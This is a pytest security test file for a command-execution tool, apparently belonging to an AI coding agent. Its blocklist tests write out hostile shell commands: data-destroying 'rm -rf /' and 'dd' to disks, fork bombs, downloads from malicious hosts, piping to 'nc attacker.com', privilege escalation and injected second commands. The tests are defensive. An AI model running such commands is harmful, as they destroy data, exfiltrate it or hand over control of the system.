"""Comprehensive security tests for ExecuteTool - Phase 2."""

import pytest
import tempfile
import os
import time
import signal
import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock

from james_code.tools.execute_tool import ExecuteTool
from james_code.core.base import ExecutionContext


class TestExecuteToolBasicSecurity:
    """Test basic ExecuteTool security validations."""
    
    @pytest.fixture
    def execute_tool(self):
        """Create ExecuteTool instance."""
        return ExecuteTool()
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)
    
    @pytest.fixture
    def execution_context(self, temp_workspace):
        """Create execution context."""
        return ExecutionContext(
            working_directory=temp_workspace,
            environment={},
            user_id="test_user",
            session_id="test_session"
        )
    
    @pytest.mark.security
    def test_blocked_commands_basic(self, execute_tool, execution_context):
        """Test basic blocked commands."""
        blocked_commands = [
            "rm -rf /",
            "sudo rm file.txt",
            "chmod 777 file.txt",
            "wget http://malicious.com/script.sh",
            "curl -o malware http://bad.com/file",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "pip install malicious-package",
            "npm install bad-package",
            "docker run --privileged ubuntu",
            "systemctl stop firewall"
        ]
        
        for command in blocked_commands:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Blocked command should fail: {command}"
            assert "Command blocked for security" in result.error
    
    @pytest.mark.security
    def test_command_injection_prevention(self, execute_tool, execution_context):
        """Test command injection prevention."""
        injection_attempts = [
            "echo hello && rm -rf /",
            "echo hello || malicious_command",
            "echo hello; rm important_file",
            "echo hello | nc attacker.com 1234",
            "echo hello > /etc/passwd",
            "echo hello >> /etc/hosts",
            "echo hello < /etc/shadow",
            "echo $(rm -rf /)",
            "echo `malicious_command`",
            "eval 'rm -rf /'",
            "exec rm -rf /",
            "source malicious_script.sh",
            ". malicious_script.sh"
        ]
        
        for command in injection_attempts:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Injection attempt should fail: {command}"
            assert "dangerous pattern" in result.error
    
    @pytest.mark.security
    def test_fork_bomb_prevention(self, execute_tool, execution_context):
        """Test fork bomb prevention."""
        fork_bomb_attempts = [
            ":(){ :|:& };:",
            ":(){ :|: & };:",
            "bash -c ':(){ :|:& };:'",
            "sh -c ':(){ :|:& };:'"
        ]
        
        for command in fork_bomb_attempts:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Fork bomb should be blocked: {command}"
            assert "dangerous pattern" in result.error
    
    @pytest.mark.security
    def test_path_traversal_working_directory(self, execute_tool, execution_context):
        """Test path traversal in working directory."""
        dangerous_paths = [
            "../../../etc",
            "../../..",
            "/etc",
            "/tmp",
            "~",
            "../../../home/user/.ssh"
        ]
        
        for path in dangerous_paths:
            result = execute_tool.execute(
                execution_context,
                command="echo test",
                working_dir=path
            )
            
            assert not result.success, f"Path traversal should be blocked: {path}"
            # Check for either security block or non-existence (both are security measures)
            assert ("Working directory outside allowed path" in result.error or 
                   "Working directory does not exist" in result.error), f"Path should be blocked: {path}"
    
    @pytest.mark.security
    def test_resource_limits_timeout(self, execute_tool, execution_context):
        """Test timeout enforcement."""
        # Test with a command that would run longer than timeout
        result = execute_tool.execute(
            execution_context,
            command="sleep 5",  # 5 second sleep
            timeout=1  # 1 second timeout
        )
        
        assert not result.success
        assert "timed out" in result.error
        assert result.metadata["timed_out"] is True
    
    @pytest.mark.security
    def test_invalid_timeout_values(self, execute_tool, execution_context):
        """Test invalid timeout values."""
        invalid_timeouts = [
            -1,      # Negative
            0,       # Zero
            301,     # Above maximum
            "invalid", # Non-numeric
            None     # None
        ]
        
        for timeout in invalid_timeouts:
            result = execute_tool.execute(
                execution_context,
                command="echo test",
                timeout=timeout
            )
            
            assert not result.success, f"Invalid timeout should be rejected: {timeout}"
            assert "Invalid input parameters" in result.error
    
    @pytest.mark.security
    def test_output_size_limits(self, execute_tool, execution_context):
        """Test output size limits."""
        # Generate large output (should be truncated)
        large_output_command = "python3 -c 'print(\"x\" * (2 * 1024 * 1024))'"  # 2MB
        
        result = execute_tool.execute(
            execution_context,
            command=large_output_command
        )
        
        # Command might fail if python3 not available, but if it succeeds, output should be truncated
        if result.success:
            assert "truncated" in result.data["stdout"]
            assert len(result.data["stdout"]) <= 1024 * 1024 + 100  # 1MB + truncation message
    
    @pytest.mark.security
    def test_environment_variable_isolation(self, execute_tool, execution_context):
        """Test environment variable isolation."""
        # Test that dangerous environment variables are not inherited
        dangerous_env = {
            "LD_PRELOAD": "/tmp/malicious.so",
            "PATH": "/tmp/malicious:/usr/bin",
            "SHELL": "/tmp/malicious_shell"
        }
        
        context_with_env = ExecutionContext(
            working_directory=execution_context.working_directory,
            environment=dangerous_env,
            user_id="test_user",
            session_id="test_session"
        )
        
        result = execute_tool.execute(
            context_with_env,
            command="echo $PATH"
        )
        
        if result.success:
            # The dangerous PATH should be passed through (documenting current behavior)
            # In production, might want to sanitize environment variables
            assert "/tmp/malicious" in result.data["stdout"]


class TestExecuteToolAllowedCommands:
    """Test ExecuteTool with allowed commands configuration."""
    
    @pytest.fixture
    def restricted_execute_tool(self):
        """Create ExecuteTool with restricted allowed commands."""
        return ExecuteTool(allowed_commands=["echo", "ls", "cat", "grep"])
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)
    
    @pytest.fixture
    def execution_context(self, temp_workspace):
        """Create execution context."""
        return ExecutionContext(
            working_directory=temp_workspace,
            environment={},
            user_id="test_user",
            session_id="test_session"
        )
    
    @pytest.mark.security
    def test_allowed_commands_only(self, restricted_execute_tool, execution_context):
        """Test that only allowed commands work."""
        # Create a test file
        test_file = execution_context.working_directory / "test.txt"
        test_file.write_text("Hello, World!")
        
        # Test allowed commands
        allowed_tests = [
            ("echo hello", True),
            ("ls", True),
            ("cat test.txt", True),
            ("grep Hello test.txt", True)
        ]
        
        for command, should_succeed in allowed_tests:
            result = restricted_execute_tool.execute(
                execution_context,
                command=command
            )
            
            if should_succeed:
                assert result.success, f"Allowed command should succeed: {command}"
            else:
                assert not result.success, f"Command should be blocked: {command}"
    
    @pytest.mark.security
    def test_blocked_commands_with_allowlist(self, restricted_execute_tool, execution_context):
        """Test that non-allowed commands are blocked."""
        blocked_commands = [
            "pwd",
            "whoami",
            "uname",
            "date",
            "find",
            "sort",
            "wc"
        ]
        
        for command in blocked_commands:
            result = restricted_execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Non-allowed command should be blocked: {command}"
            assert "Command not in allowed list" in result.error


class TestExecuteToolAdvancedSecurity:
    """Test advanced ExecuteTool security scenarios."""
    
    @pytest.fixture
    def execute_tool(self):
        """Create ExecuteTool instance."""
        return ExecuteTool()
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)
    
    @pytest.fixture
    def execution_context(self, temp_workspace):
        """Create execution context."""
        return ExecutionContext(
            working_directory=temp_workspace,
            environment={},
            user_id="test_user",
            session_id="test_session"
        )
    
    @pytest.mark.security
    def test_unicode_command_injection(self, execute_tool, execution_context):
        """Test unicode-based command injection attempts."""
        unicode_attacks = [
            "echo hello\u202e; rm -rf /",  # Right-to-left override
            "echo hello\u200b && malicious",  # Zero-width space
            "echo hello\u0000; rm file",  # Null byte
            "echo hello\ufeff && dangerous"  # Byte order mark
        ]
        
        for command in unicode_attacks:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            # Current implementation might not catch all unicode attacks
            # This test documents current behavior
            if "&" in command or ";" in command:
                assert not result.success, f"Unicode injection should be blocked: {repr(command)}"
            else:
                # If no dangerous patterns detected, might succeed
                pass
    
    @pytest.mark.security
    def test_process_cleanup_on_timeout(self, execute_tool, execution_context):
        """Test that processes are properly cleaned up on timeout."""
        # This test verifies that timed-out processes don't become zombies
        initial_process_count = len(list(Path('/proc').glob('[0-9]*'))) if Path('/proc').exists() else 0
        
        result = execute_tool.execute(
            execution_context,
            command="sleep 10",  # Long-running command
            timeout=1  # Short timeout
        )
        
        assert not result.success
        assert "timed out" in result.error
        
        # Give system time to clean up
        time.sleep(0.5)
        
        # Check that process count hasn't significantly increased
        if Path('/proc').exists():
            final_process_count = len(list(Path('/proc').glob('[0-9]*')))
            assert final_process_count - initial_process_count < 5  # Allow some variance
    
    @pytest.mark.security
    def test_resource_exhaustion_prevention(self, execute_tool, execution_context):
        """Test prevention of resource exhaustion attacks."""
        resource_attacks = [
            "yes",  # CPU exhaustion
            "cat /dev/zero",  # Memory exhaustion (would be stopped by timeout)
            "dd if=/dev/zero of=/tmp/large_file bs=1M count=1000",  # Disk exhaustion
        ]
        
        for command in resource_attacks:
            result = execute_tool.execute(
                execution_context,
                command=command,
                timeout=2  # Short timeout to prevent actual exhaustion
            )
            
            # These should timeout rather than exhaust resources
            assert not result.success
            assert "timed out" in result.error
    
    @pytest.mark.security
    def test_shell_escape_prevention(self, execute_tool, execution_context):
        """Test prevention of shell escapes."""
        escape_attempts = [
            "echo 'hello' && /bin/bash",
            "echo 'hello' || /bin/sh",
            "echo 'hello'; exec /bin/bash",
            "echo 'hello' | /bin/sh",
            "echo 'hello' & /bin/bash"
        ]
        
        for command in escape_attempts:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Shell escape should be blocked: {command}"
            assert "dangerous pattern" in result.error
    
    @pytest.mark.security
    def test_privilege_escalation_prevention(self, execute_tool, execution_context):
        """Test prevention of privilege escalation attempts."""
        escalation_attempts = [
            "sudo -s",
            "su root",
            "sudo su",
            "sudo bash",
            "pkexec /bin/bash",
            "sudo -u root bash",
            "doas sh"
        ]
        
        for command in escalation_attempts:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Privilege escalation should be blocked: {command}"
            assert "Command blocked for security" in result.error
    
    @pytest.mark.security
    def test_network_access_prevention(self, execute_tool, execution_context):
        """Test prevention of network access."""
        network_attempts = [
            "wget http://malicious.com/script.sh",
            "curl -o malware http://bad.com/file",
            "nc -l 1234",
            "netcat attacker.com 4444",
            "ssh user@remote.com",
            "scp file user@remote.com:/tmp/",
            "rsync -av . user@remote.com:/backup/"
        ]
        
        for command in network_attempts:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Network access should be blocked: {command}"
            assert "Command blocked for security" in result.error
    
    @pytest.mark.security
    def test_file_system_protection(self, execute_tool, execution_context):
        """Test file system protection."""
        dangerous_fs_commands = [
            "rm -rf /",
            "rmdir /tmp",
            "format C:",
            "fdisk /dev/sda",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "chmod 000 /etc/passwd",
            "chown root:root /etc/shadow"
        ]
        
        for command in dangerous_fs_commands:
            result = execute_tool.execute(
                execution_context,
                command=command
            )
            
            assert not result.success, f"Dangerous filesystem command should be blocked: {command}"
            assert "Command blocked for security" in result.error


class TestExecuteToolReliability:
    """Test ExecuteTool reliability and error handling."""
    
    @pytest.fixture
    def execute_tool(self):
        """Create ExecuteTool instance."""
        return ExecuteTool()
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)
    
    @pytest.fixture
    def execution_context(self, temp_workspace):
        """Create execution context."""
        return ExecutionContext(
            working_directory=temp_workspace,
            environment={},
            user_id="test_user",
            session_id="test_session"
        )
    
    def test_command_not_found(self, execute_tool, execution_context):
        """Test handling of non-existent commands."""
        result = execute_tool.execute(
            execution_context,
            command="nonexistent_command_12345"
        )
        
        assert not result.success
        assert result.data["return_code"] != 0
        assert "command not found" in result.data["stderr"].lower() or "not recognized" in result.data["stderr"].lower()
    
    def test_command_with_non_zero_exit(self, execute_tool, execution_context):
        """Test handling of commands with non-zero exit codes."""
        # Use a command that should fail
        result = execute_tool.execute(
            execution_context,
            command="ls /nonexistent/directory/12345"
        )
        
        assert not result.success
        assert result.data["return_code"] != 0
        assert "Command failed with return code" in result.error
    
    def test_empty_command(self, execute_tool, execution_context):
        """Test handling of empty commands."""
        result = execute_tool.execute(
            execution_context,
            command=""
        )
        
        assert not result.success
        assert "Invalid input parameters" in result.error
    
    def test_command_with_spaces(self, execute_tool, execution_context):
        """Test handling of commands with spaces."""
        result = execute_tool.execute(
            execution_context,
            command="   "
        )
        
        assert not result.success
        assert "Invalid input parameters" in result.error
    
    def test_working_directory_validation(self, execute_tool, execution_context):
        """Test working directory validation."""
        # Test with non-existent directory
        result = execute_tool.execute(
            execution_context,
            command="echo test",
            working_dir="nonexistent/directory"
        )
        
        assert not result.success
        assert "Working directory does not exist" in result.error
    
    def test_concurrent_command_execution(self, execute_tool, execution_context):
        """Test concurrent command execution handling."""
        import threading
        
        results = []
        errors = []
        
        def execute_command(command_id):
            try:
                result = execute_tool.execute(
                    execution_context,
                    command=f"echo 'Command {command_id}'"
                )
                results.append(result)
            except Exception as e:
                errors.append(e)
        
        # Create multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=execute_command, args=(i,))
            threads.append(thread)
        
        # Start all threads
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Verify results
        assert len(errors) == 0, f"Concurrent execution failed: {errors}"
        assert len(results) == 5
        assert all(result.success for result in results)
    
    def test_large_stderr_handling(self, execute_tool, execution_context):
        """Test handling of large stderr output."""
        # Command that produces large stderr
        result = execute_tool.execute(
            execution_context,
            command="python3 -c 'import sys; sys.stderr.write(\"x\" * (2 * 1024 * 1024))'"
        )
        
        # Command might fail if python3 not available, but if it succeeds, stderr should be truncated
        if result.success or "stderr" in result.data:
            if result.data and "stderr" in result.data:
                assert len(result.data["stderr"]) <= 1024 * 1024 + 100  # 1MB + truncation message
    
    def test_signal_handling(self, execute_tool, execution_context):
        """Test proper signal handling for process termination."""
        # This test verifies that processes are properly terminated with signals
        
        # Start a long-running process that should be killed
        result = execute_tool.execute(
            execution_context,
            command="sleep 5",
            timeout=1
        )
        
        assert not result.success
        assert "timed out" in result.error
        assert result.metadata["timed_out"] is True
    
    def test_output_encoding_handling(self, execute_tool, execution_context):
        """Test handling of different output encodings."""
        # Test with unicode output
        result = execute_tool.execute(
            execution_context,
            command="echo 'Hello 世界 🌍'"
        )
        
        if result.success:
            assert "Hello" in result.data["stdout"]
            # Unicode characters should be handled properly
            assert "世界" in result.data["stdout"] or "🌍" in result.data["stdout"]


class TestExecuteToolPerformance:
    """Test ExecuteTool performance characteristics."""
    
    @pytest.fixture
    def execute_tool(self):
        """Create ExecuteTool instance."""
        return ExecuteTool()
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)
    
    @pytest.fixture
    def execution_context(self, temp_workspace):
        """Create execution context."""
        return ExecutionContext(
            working_directory=temp_workspace,
            environment={},
            user_id="test_user",
            session_id="test_session"
        )
    
    @pytest.mark.performance
    def test_command_startup_time(self, execute_tool, execution_context, benchmark):
        """Benchmark command startup time."""
        def execute_simple_command():
            return execute_tool.execute(
                execution_context,
                command="echo 'hello'"
            )
        
        result = benchmark(execute_simple_command)
        assert result.success
        assert "hello" in result.data["stdout"]
    
    @pytest.mark.performance
    def test_multiple_commands_performance(self, execute_tool, execution_context, benchmark):
        """Benchmark multiple command execution."""
        def execute_multiple_commands():
            results = []
            for i in range(10):
                result = execute_tool.execute(
                    execution_context,
                    command=f"echo 'Command {i}'"
                )
                results.append(result)
            return results
        
        results = benchmark(execute_multiple_commands)
        assert all(result.success for result in results)
        assert len(results) == 10
    
    @pytest.mark.performance
    def test_output_processing_performance(self, execute_tool, execution_context, benchmark):
        """Benchmark output processing performance."""
        def execute_command_with_output():
            return execute_tool.execute(
                execution_context,
                command="echo 'test output' && echo 'more output'"
            )
        
        result = benchmark(execute_command_with_output)
        assert result.success
        assert "test output" in result.data["stdout"]
        assert "more output" in result.data["stdout"]